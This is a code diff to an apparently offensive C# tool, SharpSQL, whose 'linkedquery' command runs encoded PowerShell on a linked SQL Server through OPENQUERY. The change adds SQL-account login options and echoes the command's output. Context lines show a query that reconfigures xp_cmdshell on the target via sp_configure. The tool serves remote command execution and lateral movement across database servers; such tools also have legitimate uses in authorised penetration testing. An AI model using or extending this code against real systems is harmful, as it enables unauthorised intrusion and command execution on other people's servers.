@@ -12,13 +12,22 @@ namespace SharpSQL.Commands
         public void Execute(Dictionary<string, string> arguments)
         {
             Console.WriteLine("[*] Action: Execute Encoded PowerShell Command on Linked SQL Server via 'OPENQUERY'");
-            Console.WriteLine("\tUsage: SharpSQL.exe linkedquery /db:DATABASE /server:SERVER /target:TARGET /command:COMMAND\r\n");
+            Console.WriteLine("\tUsage: SharpSQL.exe linkedquery /db:DATABASE /server:SERVER /target:TARGET /command:COMMAND [/sqlauth /user:SQLUSER /password:SQLPASSWORD]\r\n");
 
+            string user = "";
+            string password = "";
+            string connectInfo = "";
             string database = "";
             string connectserver = "";
             string target = "";
             string cmd = "";
 
+            bool sqlauth = false;
+
+            if (arguments.ContainsKey("/sqlauth"))
+            {
+                sqlauth = true;
+            }
             if (arguments.ContainsKey("/db"))
             {
                 database = arguments["/db"];
@@ -57,7 +66,33 @@ namespace SharpSQL.Commands
                 return;
             }
 
-            string connectInfo = "Server = " + connectserver + "; Database = " + database + "; Integrated Security = True;";
+            if (sqlauth)
+            {
+                if (arguments.ContainsKey("/user"))
+                {
+                    user = arguments["/user"];
+                }
+                if (arguments.ContainsKey("/password"))
+                {
+                    password = arguments["/password"];
+                }
+                if (String.IsNullOrEmpty(user))
+                {
+                    Console.WriteLine("\r\n[X] You must supply the SQL account user!\r\n");
+                    return;
+                }
+                if (String.IsNullOrEmpty(password))
+                {
+                    Console.WriteLine("\r\n[X] You must supply the SQL account password!\r\n");
+                    return;
+                }
+                connectInfo = "Data Source= " + connectserver + "; Initial Catalog= " + database + "; User ID=" + user + "; Password=" + password;
+            }
+            else
+            {
+                connectInfo = "Server = " + connectserver + "; Database = " + database + "; Integrated Security = True;";
+            }
+
             SqlConnection connection = new SqlConnection(connectInfo);
 
             try
@@ -90,6 +125,7 @@ namespace SharpSQL.Commands
             reader = command.ExecuteReader();
             reader.Read();
             Console.WriteLine("[*] Executing command..");
+            Console.WriteLine("[+] Command result: " + reader[0]);
             reader.Close();
 
             string disableXP = $"SELECT 1 FROM OPENQUERY(\"{target}\", 'SELECT 1; EXEC sp_configure ''xp_cmdshell'', 0; RECONFIGURE;')";
